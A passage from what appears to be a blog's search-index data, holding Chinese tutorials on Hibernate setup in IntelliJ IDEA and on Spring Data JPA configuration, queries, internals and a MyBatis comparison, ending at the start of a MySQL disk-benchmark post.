mapping，对象关系映射\n\nORM也是一种对数据库访问的封装，然而ORM不像DAO只是一种软件设计的指导原则，强调的是系统应该层次分明，更像是一种工具，有着成熟的产品，比如JAVA界非常有名的Hibernate，以及很多PHP框架里自带的ORM库。他们的好处在于能将你程序中的数据对象自动地转化为关系型数据库中对应的表和列，数据对象间的引用也可以通过这个工具转化为表之间的JOIN。使用ORM的好处就是使得你的开发几乎不用接触到SQL语句。创建一张表，声明一个对应的类，然后你就只用和这个类的实例进行交互了，至于这个对象里的数据该怎么存储又该怎么获取，通通不用关心。\n\n#### 3.6.Active Record\n\nActive Record则是随着ruby on rails的流行而火起来的一种ORM模式，它是把负责持久化的代码也集成到数据对象中，即这个数据对象知道怎样把自己存到数据库里。这与以往的ORM有不同，传统的ORM会把数据对象和负责持久化的代码分开，数据对象只是一个单纯包含数据的结构体，在模型层和ORM层中传递。而在Active Record中，模型层集成了ORM的功能，他们既代表实体，包含业务逻辑，又是数据对象，并负责把自己存储到数据库中，当然，存储的这一部分代码是早已在模型的父类中实现好了的，属于框架的一部分，模型只需简单的调用父类的方法来完成持久化而已。\n\n\n### 4.什么是 Hibernate\n\n> [http://hibernate.org/](http://hibernate.org/)\n\n从不同的角度有不同的理解：\n\n它是连接java应用程序与关系数据库的中间件；\n\n它对JDBC API进行了封装，负责Java对象的持久化；\n\n在分层软件框架中它位于持久化层，封装了所有数据访问细节，使业务逻辑层可以专注实现业务逻辑；\n\n它是一种ORM映射工具，能够建立面向对象模型与关系数据模型的映射。\n\nHibernate 将 Java 类映射到数据库表中，从 Java 数据类型中映射到 SQL 数据类型中，并把开发人员从 95% 的公共数据持续性编程工作中解放出来。\n\n### 5.实战（IntelliJ IDEA）\n\n#### 5.1.创建一个 Hibernate Project\n\n使用 IDEA Ultimate 版本新建一个 Java Project，勾选上 Hibernate 选项和下面的 第一个选项 Create default hibernate configuration and main class 选项(可以根据需求选择版本，这里我选择的是当前最新的版本，\bHibernate5.3.2)。Next 下一步即可。\n\n![new-project](https://up-img.yonghong.tech/pic/2021/07/29-17-01-new-project-Wr12C9.png)\n\n这样的话就会自动将 Hibernate 添加到自己的项目中，并且自动生成了一部分 Hibernate 配置文件。\n\n如图：\n![project-structure](https://up-img.yonghong.tech/pic/2021/07/29-17-08-project-structure-I86YpX.png)\n\n#### 5.2.引入 MySQL JDBC Driver\n\n\b在项目上右键 Open Module Settings -> Libraries\n\n点击加号 \bFrom Maven \n\n![mysql-jdbc-driver](https://up-img.yonghong.tech/pic/2021/07/29-17-08-mysql-jdbc-driver-C5L45d.png)\n\n输入 mysql:mysql-connector-java:8.0.11 (当前最新版本，可以根据需求选择合适的版本) 勾选 Download to (path to lib)\n\n#### 5.3.创建一个实体类 Student.java\n\n```java\npackage com.example;\n\npublic class Student {\n    private int id;\n    private String name;\n    private String sex;\n    private String address;\n    private String password;\n\n    public Student() {}\n\n    public int getId() {\n        return id;\n    }\n\n    public void setId(int id) {\n        this.id = id;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public String getSex() {\n        return sex;\n    }\n\n    public void setSex(String sex) {\n        this.sex = sex;\n    }\n\n    public String getAddress() {\n        return address;\n    }\n\n    public void setAddress(String address) {\n        this.address = address;\n    }\n\n    public String getPassword() {\n        return password;\n    }\n\n    public void setPassword(String password) {\n        this.password = password;\n    }\n}\n```\n\n#### 5.4.创建映射文件 Student.hbm.xml\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\" ?>\n<!DOCTYPE hibernate-mapping PUBLIC\n        \"-//Hibernate/Hibernate Mapping DTD//EN\"\n        \"http://www.hibernate.org/dtd/hibernate-mapping-3.0.dtd\">\n\n<hibernate-mapping>\n    <class name=\"com.example.Student\" table=\"h_student\">\n        <meta attribute=\"class-description\">\n            This class contains the student detail.\n        </meta>\n        <id name=\"id\">\n            <generator class=\"native\"/>\n        </id>\n        <property name=\"name\"></property>\n        <property name=\"sex\"></property>\n        <property name=\"address\"></property>\n        <property name=\"password\"></property>\n    </class>\n</hibernate-mapping>\n```\n\n#### 5.5.配置 hibernate.cfg.xml\n\n```xml\n<?xml version='1.0' encoding='utf-8'?>\n<!DOCTYPE hibernate-configuration PUBLIC\n        \"-//Hibernate/Hibernate Configuration DTD//EN\"\n        \"http://www.hibernate.org/dtd/hibernate-configuration-3.0.dtd\">\n<hibernate-configuration>\n    <session-factory>\n        <property name=\"hibernate.dialect\">\n            org.hibernate.dialect.MariaDB10Dialect\n        </property>\n        <property name=\"hibernate.connection.driver_class\">\n            com.mysql.jdbc.Driver\n        </property>\n\n        <property name=\"hibernate.connection.url\">\n            jdbc:mysql:///hibernate?useUnicode=true&amp;characterEncoding=UTF-8\n        </property>\n        <property name=\"hibernate.connection.username\">wyh</property>\n        <property name=\"hibernate.connection.password\">123456</property>\n\n        <property name=\"hibernate.hbm2ddl.auto\">update</property>\n\n        <property name=\"hibernate.show_sql\">true</property>\n        <property name=\"hibernate.format_sql\">true</property>\n        <mapping resource=\"com/example/Student.hbm.xml\"></mapping>\n    </session-factory>\n</hibernate-configuration>\n```\n\n#### 5.6.在数据库中创建一个数据库 hibernate\n\n#### 5.7.写一个测试用例\n\n```java\npackage com.test;\n\nimport com.example.Student;\nimport org.hibernate.*;\nimport org.hibernate.cfg.Configuration;\n\npublic class Test {\n\n    public static void main(String[] args) {\n\n        // 加载 Hibernate 核心配置文件\n        Configuration configuration = new Configuration();\n        configuration.configure();\n\n        // 创建 SessionFactory 对象\n        SessionFactory sessionFactory = configuration.buildSessionFactory();\n\n        // 使用 SessionFactory 创建 Session 对象\n        Session session = sessionFactory.openSession();\n\n        // 开启事务\n        Transaction transaction = session.beginTransaction();\n\n        // 具体 crud 操作\n        Student student = new Student();\n        student.setName(\"张三三\");\n        student.setSex(\"男\");\n        student.setAddress(\"北京市朝阳区\");\n        student.setPassword(\"123456\");\n\n        // 提交事务\n        session.save(student);\n        transaction.commit();\n\n        // 关闭资源\n        session.close();\n        sessionFactory.close();\n    }\n}\n\n```\n\n#### 5.8.执行结果\n\n![h_student](https://up-img.yonghong.tech/pic/2021/07/29-17-09-h_student-tLuSPA.png)\n\n![h_student_item](https://up-img.yonghong.tech/pic/2021/07/29-17-09-h_student_item-4L1LsN.png)\n\n#### 5.9.下载示例\n\n<a href=\"/assets/zip/Hibernate001.zip\" download>下载 Hibernate 示例</a>\n\n### 6.HibernateUtils 类\n\n由于 SessionFactory 是在每次执行时都会检查是否已经建表，因此开销很大，解决办法是用一个 HibernateUtils 类，\b程序只需执行一次初始化即可。（初始化采用 static 代码块）\n\n```java\nimport org.hibernate.SessionFactory;\nimport org.hibernate.cfg.Configuration;\n\npublic class HibernateUtils {\n\n    private static final SessionFactory sessionFactory;\n\n    static {\n        try {\n            // 加载 Hibernate 核心配置文件\n            Configuration configuration = new Configuration();\n            configuration.configure();\n            sessionFactory = configuration.buildSessionFactory();\n        } catch (Throwable ex) {\n            throw new ExceptionInInitializerError(ex);\n        }\n    }\n\n    public static SessionFactory getSessionFactory() {\n        return sessionFactory;\n    }\n}\n```\n\n这样写好之后就只需要用 getSessionFactory() 方法就可以了。\n\n```java\nSessionFactory sessionFactory = HibernateUtils.getSessionFactory();\n```\n\n\n### 7.使用 Hibernate 的注解模式\n\n新建一个 Teacher.java 类，Hibernate的注解是什么？ 简单的说，本来放在hbm.xml文件里的映射信息，现在不用配置文件做了，改由注解来完成。\n\n\n```java\nimport javax.persistence.Entity;\nimport javax.persistence.Id;\nimport javax.persistence.Table;\n\n@Entity\n@Table(name = \"h_teacher\")\npublic class Teacher {\n\n    @Id\n    private int id;\n    private String name;\n    private String sex;\n    private String address;\n    private String password;\n\n    public Teacher() {}\n\n    public int getId() {\n        return id;\n    }\n\n    public void setId(int id) {\n        this.id = id;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public String getSex() {\n        return sex;\n    }\n\n    public void setSex(String sex) {\n        this.sex = sex;\n    }\n\n    public String getAddress() {\n        return address;\n    }\n\n    public void setAddress(String address) {\n        this.address = address;\n    }\n\n    public String getPassword() {\n        return password;\n    }\n\n    public void setPassword(String password) {\n        this.password = password;\n    }\n}\n```\n\n这样写完之后还不能直接用，要在 Hibernate 配置文件(hibernate.cfg.xml) 中声明持久化类。\n\n```xml\n<mapping class=\"com.example.Teacher\"></mapping>\n```\n\n测试结果与上述 Student 类似，不再展示。\n\n### 8.在Intellij IDEA下通过 Hibernate 逆向生成实体类\n\n参考 [在Intellij IDEA下通过Hibernate逆向生成实体类](https://www.cnblogs.com/morewindows0/p/8577351.html)\n\n创建好数据库之后，打开 Persistence 视图，在  Hibernate 上右键，Generate Persistence Mapping -> By Database Schema \n\n![import-database-schema](https://up-img.yonghong.tech/pic/2021/07/29-17-09-import-database-schema-6atflh.png)\n\n这样就自动生成了实体类。如图：\n\n![SC](https://up-img.yonghong.tech/pic/2021/07/29-17-09-SC-P0o8Nv.png)\n\n\n### 参考文献\n\n[DAL、DAO、ORM、Active Record辨析](https://blog.csdn.net/suiye/article/details/7824943)\n\n[理解java三层架构：持久层、业务层、表现层](https://blog.csdn.net/m0_38021128/article/details/69372109)\n\n[百度百科-三层架构](https://baike.baidu.com/item/%E4%B8%89%E5%B1%82%E6%9E%B6%E6%9E%84)\n\n[Java web 中的 三层架构](https://zhuanlan.zhihu.com/p/30832759)\n\n[极客学院-hibernate 教程](http://wiki.jikexueyuan.com/project/hibernate/)\n\n[Hibernate是什么？](https://www.cnblogs.com/talo/articles/1647830.html)\n\n[Intellij IDEA下的第一个Hibernate项目](https://blog.csdn.net/qq_15096707/article/details/51419304)\n\n[IDEA添加hibernate配置文件（包括cfg和hbm）](https://blog.csdn.net/sinat_18538231/article/details/77986020)\n\n[Intellij IDEA创建第一个hibernate项目](https://blog.csdn.net/chensanwa/article/details/79103569)\n\n[在Intellij IDEA下通过Hibernate逆向生成实体类](https://www.cnblogs.com/morewindows0/p/8577351.html)\n\n[Hibernate注解-使用注解示例](https://blog.csdn.net/wo_shi_LTB/article/details/79157243)","categories":["Hibernate"],"tags":["Java","Hibernate"]},{"title":"Spring Data JPA 全面解析","url":"/2018/10/2018-10-30-springboot-jpa/","content":"\n### Spring Data JPA 是什么\n\nJPA （The Java Persistence API）是用于访问，持久化和管理 Java 对象/类与关系型数据库之间的数据交互的 Java 规范。\n\n> 注意，JPA 只是一个标准，只定义了一系列接口，而没有具体的实现。\n\n<!-- more -->\n\n很多企业级框架提供了对 JPA 的实现，如 Spring 。因此 Spring 本身与 JPA 无关，只是提供了对 JPA 的支持，因此在 Spring 中你也会看到很多注解都是属于 javax.persistence 包的。\n\nJPA 的出现主要是为了简化现有的持久化开发工作和整合 ORM 技术，结束现在 Hibernate，TopLink，JDO 等 ORM 框架各自为营的局面。值得注意的是，JPA 是在充分吸收了现有 Hibernate，TopLink，JDO 等ORM框架的基础上发展而来的，具有易于使用，伸缩性强等优点。从目前的开发社区的反应上看，JPA 受到了极大的支持和赞扬，其中就包括了 Spring 与 EJB3.0 的开发团队。\n\nSpring Data JPA 是 Spring 基于 ORM 框架、JPA 规范的基础上封装的一套 JPA 应用框架，底层使用了 Hibernate 的 JPA 技术实现，可使开发者用极简的代码即可实现对数据的访问和操作。它提供了包括增删改查等在内的常用功能，且易于扩展！学习并使用 Spring Data JPA 可以极大提高开发效率！\n\n> spring data jpa 让我们解脱了 DAO 层的操作，基本上所有 CRUD 都可以依赖于它来实现\n\n### 配置 Spring Data JPA\n\nMaven - pom.xml\n\n```xml\n<dependency>\n    <groupId>mysql</groupId>\n    <artifactId>mysql-connector-java</artifactId>\n</dependency>\n\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-data-jpa</artifactId>\n</dependency>\n```\n\n为什么这里不指定版本号呢？\n- 因为 spring boot 的 pom 依赖了 parent，部分 jar 包的版本已在 parent 中指定，故不建议显示指定\n\n```xml\n<parent>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-parent</artifactId>\n    <version>2.0.6.RELEASE</version>\n    <relativePath /> <!-- lookup parent from repository -->\n</parent>\n```\n\n继续配置 application.yml\n\n```yml\nspring:\n  datasource:\n    driver-class-name: com.mysql.jdbc.Driver\n    username: root\n    password: 123456\n    url: jdbc:mysql://localhost/sell?characterEncoding=utf-8&useSSL=false\n  jpa:\n    show-sql: true\n```\n\n或者是 application.properties\n\n```\nspring.datasource.url=jdbc:mysql://localhost/sell?characterEncoding=utf-8&useSSL=false\nspring.datasource.username=root\nspring.datasource.password=123456\nspring.datasource.driver-class-name=com.mysql.jdbc.Driver\nspring.jpa.show-sql=true\n```\n\n配置就这么简单，下面简单介绍下 spring.jpa.properties.hibernate.hbm2ddl.auto 有几种配置：\n\n- create：每次加载Hibernate时都会删除上一次生成的表（包括数据），然后重新生成新表，即使两次没有任何修改也会这样执行。适用于每次执行单测前清空数据库的场景。\n- create-drop：每次加载Hibernate时都会生成表，但当SessionFactory关闭时，所生成的表将自动删除。\n- update：最常用的属性值，第一次加载Hibernate时创建数据表（前提是需要先有数据库），以后加载Hibernate时不会删除上一次生成的表，会根据实体更新，只新增字段，不会删除字段（即使实体中已经删除）。\n- validate：每次加载Hibernate时都会验证数据表结构，只会和已经存在的数据表进行比较，根据model修改表结构，但不会创建新表。\n\n不配置此项，表示禁用自动建表功能\n\n### 开始写代码\n\n实体类 ProductCategory.java\n\n```java\npackage com.example.demo.dataobject;\n\nimport javax.persistence.Entity;\nimport javax.persistence.GeneratedValue;\nimport javax.persistence.Id;\n\nimport lombok.Data;\n\n/**\n * 用 @Entity 注解表示这是一个实体类，与数据库相对应\n * 数据库中的表格对应的是 user\n * 如果数据库中的表名和类名不对应，应该加上 @Table 注解\n * 例：@Table(name = \"s_user\")\n * 注解 @Data 是 Lombok 实现的一个简化的写法来代替 Getter 和 Setter 方法\n */\n@Entity\n@Data\npublic class User {\n\n\t/** id 注解 @Id 表示主键，注解 @GeneratedValue 表示自增类型 */\n    @Id\n    @GeneratedValue\n    private long id;\n    @Column(nullable = false, unique = true)\n    private String userName;\n    @Column(nullable = false)\n    private String password;\n    @Column(nullable = false)\n    private int age;\n}\n```\n\n> 注：Entity中不映射成列的字段得加@Transient 注解，不加注解也会映射成列\n\n\n声明 UserRepository接口，继承JpaRepository，默认支持简单的 CRUD 操作，非常方便\n\n\n```java\nimport com.example.demo.dataobject.User;\n\nimport org.springframework.data.jpa.repository.JpaRepository;\n\npublic interface UserRepository extends JpaRepository<User, Long> {\n    User findByUserName(String userName);\n}\n```\n\n测试代码 \n\n```java\n/** \n * 注解 @Slf4j 也是 Lombok 提供的简单写法来代替 Logger 的复杂写法\n */\n@Slf4j\npublic class UserTest extends ApplicationTests {\n\n    @Autowired\n    private UserRepository userRepository;\n\n    @Test\n    @Transactional\n    public void userTest() {\n        User user = new User();\n        user.setUserName(\"0xl2oot\");\n        user.setAge(30);\n        user.setPassword(\"aaabbb\");\n        userRepository.save(user);\n        User item = userRepository.findByUserName(\"0xl2oot\");\n        log.info(JsonUtils.toJson(item));\n    }\n}\n```\n\n测试运行，成功\n\n注：[加 @Transactional 注解的原因](https://notes.0xl2oot.cn/springboot/2018/10/30/could-not-initialize-proxy-no-session.html)\n\n### 原理\n\n很多人会有疑问，直接声明接口不需要具体实现就能完成数据库的操作？下面就简单介绍下 spring data jpa 的实现原理。\n\n对单测进行debug，可以发现userRepository被注入了一个动态代理，被代理的类是JpaRepository的一个实现SimpleJpaRespositry\n\n继续往下debug,在进到findByUserName方法的时候，发现被上文提到的JdkDynamicAopProxy捕获，然后经过一系列的方法拦截，最终进到QueryExecutorMethodInterceptor.doInvoke中。这个拦截器主要做的事情就是判断方法类型，然后执行对应的操作.\n我们的findByUserName属于自定义查询，于是就进入了查询策略对应的execute方法。在执行execute时，会先选取对应的JpaQueryExecution，调用AbtractJpaQuery.getExecution()\n\n```java\nprotected JpaQueryExecution getExecution() {\n  if (method.isStreamQuery()) {\n    return new StreamExecution();\n  } else if (method.isProcedureQuery()) {\n    return new ProcedureExecution();\n  } else if (method.isCollectionQuery()) {\n    return new CollectionExecution();\n  } else if (method.isSliceQuery()) {\n    return new SlicedExecution(method.getParameters());\n  } else if (method.isPageQuery()) {\n    return new PagedExecution(method.getParameters());\n  } else if (method.isModifyingQuery()) {\n    return method.getClearAutomatically() ? new ModifyingExecution(method, em) : new ModifyingExecution(method, null);\n  } else {\n    return new SingleEntityExecution();\n  }\n}\n```\n\n如上述代码所示，根据method变量实例化时的查询设置方式，实例化不同的JpaQueryExecution子类实例去运行。我们的findByUserName最终落入了SingleEntityExecution —— 返回单个实例的 Execution。继续跟踪execute方法，发现底层使用了 hibernate 的 CriteriaQueryImpl 完成了sql的拼装，这里就不做赘述了。\n\n再来看看这类的method。在 spring-data-jpa 中，JpaQueryMethod就是Repository接口中带有@Query注解方法的全部信息，包括注解，类名，实参等的存储类，所以Repository接口有多少个@Query注解方法，就会包含多少个JpaQueryMethod实例被加入监听序列。实际运行时，一个RepositoryQuery实例持有一个JpaQueryMethod实例，JpaQueryMethod又持有一个Method实例。\n\n再来看看RepositoryQuery，在QueryExecutorMethodInterceptor中维护了一个Map<Method, RepositoryQuery> queries。RepositoryQuery的直接抽象子类是AbstractJpaQuery，可以看到，一个RepositoryQuery实例持有一个JpaQueryMethod实例，JpaQueryMethod又持有一个Method实例，所以RepositoryQuery实例的用途很明显，一个RepositoryQuery代表了Repository接口中的一个方法，根据方法头上注解不同的形态，将每个Repository接口中的方法分别映射成相对应的RepositoryQuery实例。\n\n下面我们就来看看spring-data-jpa对RepositoryQuery实例的具体分类： \n\n1.SimpleJpaQuery \n方法头上@Query注解的nativeQuery属性缺省值为false，也就是使用JPQL，此时会创建SimpleJpaQuery实例，并通过两个StringQuery类实例分别持有query jpql语句和根据query jpql计算拼接出来的countQuery jpql语句；\n\n2.NativeJpaQuery \n方法头上@Query注解的nativeQuery属性如果显式的设置为nativeQuery=true，也就是使用原生SQL，此时就会创建NativeJpaQuery实例；\n\n3.PartTreeJpaQuery \n方法头上未进行@Query注解，将使用spring-data-jpa独创的方法名识别的方式进行sql语句拼接，此时在spring-data-jpa内部就会创建一个PartTreeJpaQuery实例；\n\n4.NamedQuery \n使用javax.persistence.NamedQuery注解访问数据库的形式，此时在spring-data-jpa内部就会根据此注解选择创建一个NamedQuery实例；\n\n5.StoredProcedureJpaQuery \n顾名思义，在Repository接口的方法头上使用org.springframework.data.jpa.repository.query.Procedure注解，也就是调用存储过程的方式访问数据库，此时在spring-data-jpa内部就会根据@Procedure注解而选择创建一个StoredProcedureJpaQuery实例。\n\n那么问题来了，sql 拼接的时候怎么知道是根据userName进行查询呢？是取自方法名中的 byUsername 还是方法参数 userName 呢？ spring 具体是在什么时候知道查询参数的呢 ？\n\n### 数据如何注入\n\nspring 在启动的时候会实例化一个 Repositories，它会去扫描所有的 class，然后找出由我们定义的、继承自org.springframework.data.repository.Repositor的接口，然后遍历这些接口，针对每个接口依次创建如下几个实例:\n\n1. SimpleJpaRespositry —— 用来进行默认的 DAO 操作，是所有 Repository 的默认实现\n2. JpaRepositoryFactoryBean —— 装配 bean，装载了动态代理 Proxy，会以对应的 DAO 的 beanName 为 key 注册到DefaultListableBeanFactory中，在需要被注入的时候从这个 bean 中取出对应的动态代理 Proxy 注入给 DAO\n3. JdkDynamicAopProxy —— 动态代理对应的InvocationHandler，负责拦截 DAO 接口的所有的方法调用，然后做相应处理，比如findByUsername被调用的时候会先经过这个类的 invoke 方法\n\n在JpaRepositoryFactoryBean.getRepository()方法被调用的过程中，还是在实例化QueryExecutorMethodInterceptor这个拦截器的时候，spring 会去为我们的方法创建一个PartTreeJpaQuery，在它的构造方法中同时会实例化一个PartTree对象。PartTree定义了一系列的正则表达式，全部用于截取方法名，通过方法名来分解查询的条件，排序方式，查询结果等等，这个分解的步骤是在进程启动时加载 Bean 的过程中进行的，当执行查询的时候直接取方法对应的PartTree用来进行 sql 的拼装，然后进行 DB 的查询，返回结果。\n\n到此为止，我们整个JpaRepository接口相关的链路就算走通啦，简单的总结如下：\nspring 会在启动的时候扫描所有继承自 Repository 接口的 DAO 接口，然后为其实例化一个动态代理，同时根据它的方法名、参数等为其装配一系列DB操作组件，在需要注入的时候为对应的接口注入这个动态代理，在 DAO 方法被调用的时会走这个动态代理，然后经过一系列的方法拦截路由到最终的 DB 操作执行器 JpaQueryExecution，然后拼装 sql，执行相关操作，返回结果。\n\n### 基本查询\n\n基本查询分为两种，一种是 spring data 默认已经实现（只要继承`JpaRepository`），一种是根据查询的方法来自动解析成 SQL。\n\n####  预先生成\n\n```\npublic interface UserRepository extends JpaRepository<User, Long> {\n}\n\n@Test\npublic void testBaseQuery() throws Exception {\n    User user=new User();\n    userRepository.findAll();\n    userRepository.findOne(1l);\n    userRepository.save(user);\n    userRepository.delete(user);\n    userRepository.count();\n    userRepository.exists(1l);\n    // ...\n}\n```\n\n####  自定义简单查询\n\n自定义的简单查询就是根据方法名来自动生成SQL，主要的语法是`findXXBy,readAXXBy,queryXXBy,countXXBy, getXXBy`后面跟属性名称，举几个例子：\n\n```\nUser findByUserName(String userName);\n\nUser findByUserNameOrEmail(String username, String email);\n\nLong deleteById(Long id);\n\nLong countByUserName(String userName);\n\nList<User> findByEmailLike(String email);\n\nUser findByUserNameIgnoreCase(String userName);\n\nList<User> findByUserNameOrderByEmailDesc(String email);\n```\n\n具体的关键字，使用方法和生产成 SQL 如下表所示\n\n| Keyword           | Sample                                    | JPQL snippet                                                 |\n| ----------------- | ----------------------------------------- | ------------------------------------------------------------ |\n| And               | findByLastnameAndFirstname                | … where x.lastname = ?1 and x.firstname = ?2                 |\n| Or                | findByLastnameOrFirstname                 | … where x.lastname = ?1 or x.firstname = ?2                  |\n| Is,Equals         | findByFirstnameIs,findByFirstnameEquals   | … where x.firstname = ?1                                     |\n| Between           | findByStartDateBetween                    | … where x.startDate between ?1 and ?2                        |\n| LessThan          | findByAgeLessThan                         | … where x.age < ?1                                           |\n| LessThanEqual     | findByAgeLessThanEqual                    | … where x.age ⇐ ?1                                           |\n| GreaterThan       | findByAgeGreaterThan                      | … where x.age > ?1                                           |\n| GreaterThanEqual  | findByAgeGreaterThanEqual                 | … where x.age >= ?1                                          |\n| After             | findByStartDateAfter                      | … where x.startDate > ?1                                     |\n| Before            | findByStartDateBefore                     | … where x.startDate < ?1                                     |\n| IsNull            | findByAgeIsNull                           | … where x.age is null                                        |\n| IsNotNull,NotNull | findByAge(Is)NotNull                      | … where x.age not null                                       |\n| Like              | findByFirstnameLike                       | … where x.firstname like ?1                                  |\n| NotLike           | findByFirstnameNotLike                    | … where x.firstname not like ?1                              |\n| StartingWith      | findByFirstnameStartingWith               | … where x.firstname like ?1 (parameter bound with appended %) |\n| EndingWith        | findByFirstnameEndingWith                 | … where x.firstname like ?1 (parameter bound with prepended %) |\n| Containing        | findByFirstnameContaining                 | … where x.firstname like ?1 (parameter bound wrapped in %)   |\n| OrderBy           | findByAgeOrderByLastnameDesc              | … where x.age = ?1 order by x.lastname desc                  |\n| Not               | findByLastnameNot                         | … where x.lastname <> ?1                                     |\n| In                | findByAgeIn(Collection<age> ages)</age>   | … where x.age in ?1                                          |\n| NotIn             | findByAgeNotIn(Collection<age> age)</age> | … where x.age not in ?1                                      |\n| TRUE              | findByActiveTrue()                        | … where x.active = true                                      |\n| FALSE             | findByActiveFalse()                       | … where x.active = false                                     |\n| IgnoreCase        | findByFirstnameIgnoreCase                 | … where UPPER(x.firstame) = UPPER(?1)                        |\n\n###  复杂查询\n\n在实际的开发中我们需要用到分页、删选、连表等查询的时候就需要特殊的方法或者自定义 SQL\n\n####  分页查询\n\n分页查询在实际使用中非常普遍了，spring data jpa已经帮我们实现了分页的功能，在查询的方法中，需要传入参数`Pageable`\n，当查询中有多个参数的时候`Pageable`建议做为最后一个参数传入。`Pageable`是 spring 封装的分页实现类，使用的时候需要传入页数、每页条数和排序规则\n\n```\nPage<User> findALL(Pageable pageable);\n\nPage<User> findByUserName(String userName,Pageable pageable);\n@Test\npublic void testPageQuery() throws Exception {\n    int page=1,size=10;\n    Sort sort = new Sort(Direction.DESC, \"id\");\n    Pageable pageable = new PageRequest(page, size, sort);\n    userRepository.findALL(pageable);\n    userRepository.findByUserName(\"testName\", pageable);\n}\n```\n\n有时候我们只需要查询前N个元素，或者支取前一个实体。\n\n```\nUser findFirstByOrderByLastnameAsc();\n\nUser findTopByOrderByAgeDesc();\n\nPage<User> queryFirst10ByLastname(String lastname, Pageable pageable);\n\nList<User> findFirst10ByLastname(String lastname, Sort sort);\n\nList<User> findTop10ByLastname(String lastname, Pageable pageable);\n```\n\n####  自定义SQL查询\n\n其实 Spring data 大部分的 SQL 都可以根据方法名定义的方式来实现，但是由于某些原因我们想使用自定义的 SQL 来查询，spring data 也是完美支持的；在 SQL 的查询方法上面使用 @Query 注解，如涉及到删除和修改在需要加上 @Modifying 。也可以根据需要添加 @Transactional 对事物的支持，查询超时的设置等\n\n```\n@Modifying\n@Query(\"update User u set u.userName = ?1 where c.id = ?2\")\nint modifyByIdAndUserId(String  userName, Long id);\n\n@Transactional\n@Modifying\n@Query(\"delete from User where id = ?1\")\nvoid deleteByUserId(Long id);\n\n@Transactional(timeout = 10)\n@Query(\"select u from User u where u.emailAddress = ?1\")\nUser findByEmailAddress(String emailAddress);\n```\n\n####  多表查询\n\n多表查询在 spring data jpa 中有两种实现方式，第一种是利用 hibernate 的级联查询来实现，第二种是创建一个结果集的接口来接收连表查询后的结果，这里介绍第二种方式。\n\n首先需要定义一个结果集的接口类。\n\n```\npublic interface HotelSummary {\n\n    City getCity();\n\n    String getName();\n\n    Double getAverageRating();\n\n    default Integer getAverageRatingRounded() {\n        return getAverageRating() == null ? null : (int) Math.round(getAverageRating());\n    }\n\n}\n```\n\n查询的方法返回类型设置为新创建的接口\n\n```\n@Query(\"select h.city as city, h.name as name, avg(r.rating) as averageRating from Hotel h left outer join h.reviews r where h.city = ?1 group by h\")\nPage<HotelSummary> findByCity(City city, Pageable pageable);\n\n@Query(\"select h.name as name, avg(r.rating) as averageRating from Hotel h left outer join h.reviews r group by h\")\nPage<HotelSummary> findByCity(Pageable pageable);\nPage<HotelSummary> hotels = this.hotelRepository.findByCity(new PageRequest(0, 10, Direction.ASC, \"name\"));\nfor(HotelSummary summay:hotels){\n    System.out.println(\"Name\" +summay.getName());\n}\n```\n\n在运行中 Spring 会给接口（`HotelSummary`）自动生产一个代理类来接收返回的结果，代码会使用 getXX 的形式来获取\n\n### 和 mybatis 的比较\n\nspring data jpa 底层采用 hibernate 做为 ORM 框架，所以 spring data jpa 和 mybatis 的比较其实就是 hibernate 和 mybatis 的比较。下面从几个方面来对比下两者\n\n#### 基本概念\n\n从基本概念和框架目标上看，两个框架差别还是很大的。hibernate 是一个自动化更强、更高级的框架，毕竟在java代码层面上，省去了绝大部分 sql 编写，取而代之的是用面向对象的方式操作关系型数据库的数据。而 MyBatis 则是一个能够灵活编写 sql 语句，并将 sql 的入参和查询结果映射成 POJOs 的一个持久层框架。所以，从表面上看，hibernate 能方便、自动化更强，而 MyBatis 在 Sql 语句编写方面则更灵活自由。\n\n#### 性能\n\n正如上面介绍的， Hibernate 比 MyBatis 抽象封装的程度更高，理论上单个语句之心的性能会低一点（所有的框架都是一样，排除算法上的差异，越是底层，执行效率越高）。\n\n但 Hibernate 会设置缓存，对于重复查询有一定的优化，而且从编码效率来说，Hibernate 的编码效果肯定是会高一点的。所以，从整体的角度来看性能的话，其实两者不能完全说谁胜谁劣。\n\n####  ORM\n\nHibernate 是完备的 ORM 框架，是符合 JPA 规范的， MyBatis 没有按照JPA那套规范实现。目前 Spring 以及 Spring Boot 官方都没有针对 MyBatis 有具体的支持，但对 Hibernate 的集成一直是有的。但这并不是说 mybatis 和 spring 无法集成，MyBatis 官方社区自身也是有 对 Spring，Spring boot 集成做支持的，所以在技术上，两者都不存在问题。\n\n#### 总结\n\n总结下 mybatis 的优点：\n\n- 简单易学\n- 灵活，MyBatis不会对应用程序或者数据库的现有设计强加任何影响。 注解或者使用 SQL 写在 XML 里，便于统一管理和优化。通过 SQL 基本上可以实现我们不使用数据访问框架可以实现的所有功能，或许更多。\n- 解除 SQL 与程序代码的耦合，SQL 和代码的分离，提高了可维护性。\n- 提供映射标签，支持对象与数据库的 ORM 字段关系映射。\n- 提供对象关系映射标签，支持对象关系组建维护。\n- 提供XML标签，支持编写动态SQL。\n\nhibernate 的优点：\nJPA 的宗旨是为 POJO 提供持久化标准规范，实现使用的 Hibernate，Hibernate 是一个全自动的持久层框架，并且提供了面向对象的 SQL 支持，不需要编写复杂的 SQL 语句，直接操作 Java 对象即可，从而大大降低了代码量，让即使不懂 SQL 的开发人员，也使程序员更加专注于业务逻辑的实现。对于关联查询，也仅仅是使用一些注解即可完成一些复杂的 SQL功能。\n\n### 参考文献\n- [org.springframework.data.jpa.repository](https://docs.spring.io/spring-data/jpa/docs/2.1.2.RELEASE/api/org/springframework/data/jpa/repository/JpaRepository.html)\n- [【spring boot 系列】spring data jpa 全面解析（实践 + 源码分析）](https://segmentfault.com/a/1190000015047290)","categories":["SpringBoot"],"tags":["Java","SpringBoot","spring-data-jpa"]},{"title":"MySQL 性能测试","url":"/2018/11/2018-11-23-mysql-performance-test/","content":"\n磁盘性能测试\n\n<!-- more -->\n\n```shell\n<!-- 读性能 -->\n$ sudo hdparm -Tt /dev/sda\n\n/dev/sda:\n Timing cached reads:   31426 MB in  1.99 seconds = 15775.74 MB/sec\n Timing buffered disk reads: 540 MB in  3.01 seconds = 179.61 MB/sec\n\n<!-- 写性能 -->\n$ sync;/usr/bin/time -p bash -c 